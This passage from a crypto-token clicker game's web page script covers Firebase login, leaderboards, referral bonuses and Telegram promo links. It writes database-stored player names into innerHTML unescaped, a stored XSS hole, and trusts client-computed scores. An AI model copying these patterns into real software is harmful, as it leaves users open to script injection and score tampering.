  const durationSeconds = Math.floor(duration / 1000);
  const durationText = durationSeconds >= 3600 
    ? `${Math.floor(durationSeconds / 3600)}h ${Math.floor((durationSeconds % 3600) / 60)}m`
    : durationSeconds >= 60 
      ? `${Math.floor(durationSeconds / 60)}m ${durationSeconds % 60}s`
      : `${durationSeconds}s`;
  showMessage(`Free autoclicker activated for ${durationText}!`);
  updateAutoclickerShop();
  submitScore();
}



 //noviy autoclicker   
 function getAutoclickerDuration() {
  const baseDuration = 60 * 1000; // 1 минута
  const durationPerLevel = (maxAutoclickerDuration - baseDuration) / 19;
  return Math.floor(baseDuration + (autoclickerLevel - 1) * durationPerLevel);
 }   
    

    
   function signInWithGoogle() {
      const provider = new firebase.auth.GoogleAuthProvider();
      auth.signInWithPopup(provider).then(result => {
        user = result.user;
        document.getElementById("authSection").style.display = "none";
        document.getElementById("gameSection").style.display = "block";
        loadPlayerData(user.uid);
        loadNotifications(user.uid); // Загружаем уведомления
        submitScore();
      }).catch(error => {
        showMessage("Google sign-in failed.");
        console.error(error);
      });
    }

  /*!!  function signInWithGoogle() {
  const provider = new firebase.auth.GoogleAuthProvider();
  auth.signInWithPopup(provider).then(result => {
    user = result.user;
    document.getElementById('authSection').style.display = 'none';
    document.getElementById('gameSection').style.display = 'block';
    loadPlayerData(user.uid);
    submitScore();
    // Проверяем реферера из URL
    const urlParams = new URLSearchParams(window.location.search);
    const referrerUid = urlParams.get('ref');
    if (referrerUid) {
      saveReferrer(referrerUid);
    }
  }).catch(error => {
    showMessage('Google sign-in failed.');
    console.error(error);
  });
    }!!*/
    

/*!    function signOut() {
      if (user) {
        submitScore();
      }

      auth.signOut().then(() => {
        user = null;
        score = 0;
        clickPower = 1;
        autoclickEndTime = 0;
        clearInterval(autoclickInterval);
        document.getElementById("authSection").style.display = "block";
        document.getElementById("gameSection").style.display = "none";
        updateCounterDisplay();
        updateClickPowerBar();
        updateProfilePanel();
      });
    }!*/

 /*!!   function signOut() {
    if (user) {
        submitScore().then(() => {
            auth.signOut().then(() => {
                user = null;
                score = 0;
                clickPower = 1; // Локальный сброс, но данные сохранены в базе
                autoclickEndTime = 0;
                clearInterval(autoclickInterval);
                document.getElementById("authSection").style.display = "block";
                document.getElementById("gameSection").style.display = "none";
                updateCounterDisplay();
                updateClickPowerBar();
                updateProfilePanel();
                showMessage("Вы успешно вышли из аккаунта.");
            }).catch(error => {
                console.error("Ошибка при выходе из аккаунта:", error);
                showMessage("Не удалось выйти из аккаунта.");
            });
        }).catch(error => {
            console.error("Ошибка при сохранении данных перед выходом:", error);
            showMessage("Не удалось сохранить прогресс перед выходом.");
        });
    } else {
        auth.signOut().then(() => {
            user = null;
            score = 0;
            clickPower = 1;
            autoclickEndTime = 0;
            clearInterval(autoclickInterval);
            document.getElementById("authSection").style.display = "block";
            document.getElementById("gameSection").style.display = "none";
            updateCounterDisplay();
            updateClickPowerBar();
            updateProfilePanel();
            showMessage("Вы успешно вышли из аккаунта.");
        });
    }
}!!*/

function signOut() {
    console.log("signOut вызвана, user:", user);
    auth.signOut().then(() => {
        user = null;
        score = 0;
        clickPower = 1;
        autoclickEndTime = 0;
        clearInterval(autoclickInterval);
        document.getElementById("authSection").style.display = "block";
        document.getElementById("gameSection").style.display = "none";
        updateCounterDisplay();
        updateClickPowerBar();
        updateProfilePanel();
        showMessage("Вы успешно вышли из аккаунта.");
    }).catch(error => {
        console.error("Ошибка при выходе из аккаунта:", error);
        showMessage("Не удалось выйти из аккаунта.");
    });
}


  /*!  auth.onAuthStateChanged(currentUser => {
      if (currentUser) {
        user = currentUser;
        document.getElementById("authSection").style.display = "none";
        document.getElementById("gameSection").style.display = "block";
        loadPlayerData(user.uid);
        checkDailyReward();
        renderTasks();
      }
    });!*/

    auth.onAuthStateChanged(currentUser => {
  if (currentUser) {
    user = currentUser;
    document.getElementById("authSection").style.display = "none";
    document.getElementById("gameSection").style.display = "block";
    loadPlayerData(user.uid);
    checkDailyReward();
    renderTasks();
    startBonusTimer(); // Initialize bonus timer on login
  } else {
    if (bonusTimerInterval) clearInterval(bonusTimerInterval);
    document.getElementById("claimBonusBtn").disabled = true;
    document.getElementById("bonusTimer").innerText = "Sign in to claim";
  }
});



    // таблица лидеров
  /*! db.ref("leaderboard").on("value", snapshot => {
      const data = [];
      snapshot.forEach(child => {
        const entry = child.val();
        if (entry && entry.score !== undefined && entry.name) {
          data.push({
            id: entry.id,
            name: entry.name,
            score: entry.score
          });
        }
      });

      data.sort((a, b) => b.score - a.score);

      const leaderboard = document.getElementById("leaderboard");
      leaderboard.innerHTML = "";

      if (data.length === 0) {
        leaderboard.innerHTML = "<tr><td colspan='3'>No players yet</td></tr>";
        return;
      }

      data.slice(0, 10).forEach((entry, index) => {
        leaderboard.innerHTML += `<tr><td>${index + 1}</td><td>${entry.name}</td><td>${entry.score}</td></tr>`;
      });
    }, error => {
      console.error("Error loading leaderboard:", error);
      showMessage("Failed to load leaderboard.");
    });!*/



// Слушатель для Overall таблица лидеров 
db.ref("leaderboard").on("value", snapshot => {
  if (currentTab !== "overall") return; // Обновляем только если активна вкладка Overall

  const leaderboardBody = document.getElementById("leaderboardBody");
  const data = [];

  snapshot.forEach(child => {
    const entry = child.val();
    if (entry && entry.score !== undefined && entry.name) {
      data.push({
        id: entry.id,
        name: entry.name,
        score: entry.score
      });
    }
  });

  data.sort((a, b) => b.score - a.score);

  leaderboardBody.innerHTML = "";

  if (data.length === 0) {
    leaderboardBody.innerHTML = "<tr><td colspan='3'>No players yet</td></tr>";
    return;
  }

  data.slice(0, 10).forEach((entry, index) => {
    leaderboardBody.innerHTML += `<tr><td>${index + 1}</td><td>${entry.name}</td><td>${entry.score}</td></tr>`;
  });

  // Визуальная обратная связь
  leaderboardBody.classList.add("updated");
}, error => {
  console.error("Error loading leaderboard:", error);
  showMessage("Failed to load leaderboard.");
});


    // Слушатель для Weekly Winners таблица лидеров 
function listenToWeeklyLeaderboard() {
  const weekKey = getWeekKey();
  db.ref(`weeklyLeaderboard/${weekKey}`).on("value", snapshot => {
    if (currentTab !== "weekly") return; // Обновляем только если активна вкладка Weekly

    const leaderboardBody = document.getElementById("leaderboardBody");
    const data = [];

    snapshot.forEach(child => {
      const entry = child.val();
      if (entry && entry.score >= 50000 && entry.name) {
        data.push({
          id: entry.id,
          name: entry.name,
          score: entry.score,
          rewardClaimed: entry.rewardClaimed || false
        });
      }
    });

    data.sort((a, b) => b.score - a.score);

    leaderboardBody.innerHTML = "";

    if (data.length === 0) {
      leaderboardBody.innerHTML = "<tr><td colspan='4'>No players with 50,000+ tokens this week</td></tr>";
      return;
    }

    data.slice(0, 10).forEach((entry, index) => {
      const reward = getRewardForRank(index + 1);
      const rewardText = entry.rewardClaimed ? `${reward} (Claimed)` : reward;
      leaderboardBody.innerHTML += `<tr><td>${index + 1}</td><td>${entry.name}</td><td>${entry.score}</td><td>${rewardText}</td></tr>`;
    });

    // Визуальная обратная связь
    leaderboardBody.classList.add("updated");
  }, error => {
    console.error("Error loading weekly leaderboard:", error);
    showMessage("Failed to load weekly leaderboard.");
  });
}

// Инициализация слушателя для Weekly Winners
listenToWeeklyLeaderboard();

    

// Инициализация таблицы при загрузке
showTab("overall");

// Периодическая проверка еженедельного сброса в таблице лидеров 
setInterval(checkWeeklyReset, 10 * 60 * 1000);

    

    setInterval(() => {
      if (user) {
        updateProfilePanel();
        if (score > 0) submitScore();
      }
    }, 1000);

    const motivationalPhrases = [
      "Click — earn tokens.", "Sign in — save your progress.", "Your crypto journey starts here.",
      "No account — no profit!", "Log in and turn clicks into income!", "The first tokens are always the most valuable.",
      "Top farmers are waiting for you!", "Level up — earn even more tokens!", "Crypto wealth starts with a single click.",
      "Skip signing in — miss the rewards!"
    ];

    let motiveIndex = 0;
    const motiveElement = document.getElementById("motiveText");

    setInterval(() => {
      motiveElement.style.opacity = 0;
      setTimeout(() => {
        motiveIndex = (motiveIndex + 1) % motivationalPhrases.length;
        motiveElement.innerText = motivationalPhrases[motiveIndex];
        motiveElement.style.opacity = 1;
      }, 500);
    }, 3000);

// Внутри вашего <script> тега
window.onload = function() {
    const referrer = document.referrer;
    if (referrer) {
        console.log("Пользователь перешёл с: " + referrer);
        // Можно отобразить реферер в интерфейсе
     //   showMessage("Перешёл с: " + referrer);
        // Или сохранить в Firebase для аналитики
        saveReferrer(referrer);
    } else {
        console.log("Реферер отсутствует (прямой вход или скрыт)");
      //  showMessage("Реферер отсутствует");
    }
};

// Функция для сохранения реферера в Firebase
function saveReferrer(referrer) {
    if (user) {
        const now = new Date().toISOString();
        db.ref("referrers/" + user.uid).push({
            referrer: referrer,
            timestamp: now
        }).then(() => {
            console.log("Реферер сохранён в Firebase");
        }).catch(error => {
            console.error("Ошибка сохранения реферера:", error);
        });
    }
}



window.onload = function() {
  const urlParams = new URLSearchParams(window.location.search);
  let referrerUid = urlParams.get('ref');

  // Логируем начальное состояние URL
  console.log('Initial URL params:', window.location.search);

  // Если referrerUid есть, обрабатываем его
  if (referrerUid) {
    // Очищаем параметр ref из URL
    window.history.replaceState({}, document.title, window.location.pathname);
    console.log('URL cleaned, new URL:', window.location.href);

    // Проверяем, что URL действительно очищен
    const newUrlParams = new URLSearchParams(window.location.search);
    if (newUrlParams.get('ref')) {
      console.error('Failed to clean ref from URL in Firefox');
    }

    // Обрабатываем реферера после авторизации
    auth.onAuthStateChanged(currentUser => {
      if (currentUser) {
        user = currentUser;
        saveReferrer(referrerUid);
      }
    });
  } else {
    console.log('No referrer detected');
  }
};
  

function saveReferrer(referrerUid) {
  if (!user || !referrerUid || isProcessingReferrer) {
    console.log('Skipping saveReferrer:', { user: !!user, referrerUid, isProcessingReferrer });
    return;
  }

  isProcessingReferrer = true;
  console.log('Processing referrer:', referrerUid);

  // Проверяем, существует ли пользователь в leaderboard
  db.ref(`leaderboard/${user.uid}`).once('value').then(snapshot => {
    const userData = snapshot.val();

    // Если пользователь уже существует и бонус начислен, выходим
    if (userData && userData.referral_bonus_claimed) {
      console.log('Referral bonus already claimed for this user:', user.uid);
      isProcessingReferrer = false;
      return;
    }

    // Проверяем, существует ли приглашающий
    db.ref(`leaderboard/${referrerUid}`).once('value').then(referrerSnapshot => {
      if (!referrerSnapshot.exists()) {
        console.log('Invalid referrer UID:', referrerUid);
        isProcessingReferrer = false;
        return;
      }

      // Начисляем 50 токенов новому пользователю
      score += 50;
      showMessage('Referral bonus: +50 tokens!');
      console.log('Referral bonus applied: +50 tokens, new score:', score);
      updateCounterDisplay();

      // Сохраняем данные реферала
      db.ref(`leaderboard/${user.uid}`).update({
        referrer_uid: referrerUid,
        referral_bonus_claimed: true,
        score: score,
        lastUpdate: Date.now()
      }).then(() => {
        // Регистрируем приглашение
        db.ref(`referrals/${referrerUid}/${user.uid}`).set({
          invited_at: Date.now(),
          tokens_earned: 0,
          reward_claimed: false
        });
        submitScore();
        console.log('Referrer saved successfully:', referrerUid);
      }).catch(error => {
        console.error('Error saving referrer:', error);
        showMessage('Failed to process referral.');
      }).finally(() => {
        isProcessingReferrer = false;
      });
    }).catch(error => {
      console.error('Error checking referrer:', error);
      isProcessingReferrer = false;
    });
  }).catch(error => {
    console.error('Error checking user data:', error);
    isProcessingReferrer = false;
  });
}
    
  </script>

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-G76GTQQKG0"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-G76GTQQKG0');
  </script>



 <div style="text-align: center; margin: 20px 0;">
    <a href="https://t.me/TokenCarnivalBot/Carnival?startapp=r_464829483" target="_blank" rel="noopener" style="color: #00ffa6; font-size: 38px; font-weight: bold; text-decoration: none; text-shadow: 0 0 8px #00c3ff;">
      Just Three Spins and Get a Bonus!
    </a>
</div>

 <!-- <div style="text-align: center; margin: 20px 0;">
    <a href="https://t.me/rslite_bot/rsl_app?startapp=RZ8CSrP" target="_blank" rel="noopener" style="color: #00ffa6; font-size: 38px; font-weight: bold; text-decoration: none; text-shadow: 0 0 8px #00c3ff;">
      Free Game and Bonus
    </a>
  </div>-->
</body>
</html>
